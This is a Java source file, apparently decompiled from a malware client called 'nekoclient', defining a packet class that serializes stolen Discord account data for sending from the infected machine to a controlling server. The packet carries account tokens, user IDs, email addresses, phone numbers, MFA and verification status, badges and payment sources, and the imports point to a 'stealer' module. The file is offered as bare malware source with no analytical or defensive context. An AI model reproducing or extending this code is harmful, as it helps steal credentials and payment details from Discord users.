package dev.neko.nekoclient.packet.impl.client;

import dev.neko.nekoclient.api.buffer.FriendlyByteBuffer;
import dev.neko.nekoclient.api.buffer.StreamByteBuffer;
import dev.neko.nekoclient.api.stealer.discord.DiscordAccount;
import dev.neko.nekoclient.packet.Direction;
import dev.neko.nekoclient.packet.impl.NoncePacket;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class DiscordResponsePacket extends NoncePacket {
   private List<DiscordAccount> discordAccounts;

   public DiscordResponsePacket(String nonce, List<DiscordAccount> discordAccounts) {
      super(nonce);
      this.discordAccounts = discordAccounts;
   }

   public DiscordResponsePacket() {
   }

   @Override
   public void write(StreamByteBuffer buffer) throws IOException {
      super.write(buffer);
      buffer.putInt(this.discordAccounts.size());

      for(DiscordAccount discordAccount : this.discordAccounts) {
         buffer.putString(discordAccount.getToken());
         buffer.putString(discordAccount.getId());
         buffer.putString(discordAccount.getUsername());
         buffer.putString(discordAccount.getDiscriminator());
         buffer.putString(discordAccount.getEmail());
         buffer.putString(discordAccount.getPhone());
         buffer.putBoolean(discordAccount.isVerified());
         buffer.putBoolean(discordAccount.isMfa());
         buffer.putInt(discordAccount.getBadges().size());

         for(String badge : discordAccount.getBadges()) {
            buffer.putString(badge);
         }

         buffer.putInt(discordAccount.getPaymentSources().size());

         for(String paymentSource : discordAccount.getPaymentSources()) {
            buffer.putString(paymentSource);
         }
      }
   }

   @Override
   public void read(FriendlyByteBuffer buffer) throws IOException {
      super.read(buffer);
      int total = buffer.getInt();
      this.discordAccounts = new ArrayList<>();

      for(int i = 0; i < total; ++i) {
         String token = buffer.getString();
         String id = buffer.getString();
         String username = buffer.getString();
         String discriminator = buffer.getString();
         String email = buffer.getString();
         String phone = buffer.getString();
         boolean verified = buffer.getBoolean();
         boolean mfa = buffer.getBoolean();
         List<String> badges = new ArrayList<>();
         int badgesLength = buffer.getInt();

         for(int j = 0; j < badgesLength; ++j) {
            badges.add(buffer.getString());
         }

         List<String> paymentSources = new ArrayList<>();
         int paymentSourcesLength = buffer.getInt();

         for(int j = 0; j < paymentSourcesLength; ++j) {
            paymentSources.add(buffer.getString());
         }

         this.discordAccounts.add(new DiscordAccount(token, id, username, discriminator, email, phone, verified, mfa, badges, paymentSources));
      }
   }

   @Override
   public Direction getDirection() {
      return Direction.CLIENT_TO_SERVER;
   }

   @Override
   public String getName() {
      return "discordresponse";
   }

   public final List<DiscordAccount> getDiscordAccounts() {
      return this.discordAccounts;
   }
}
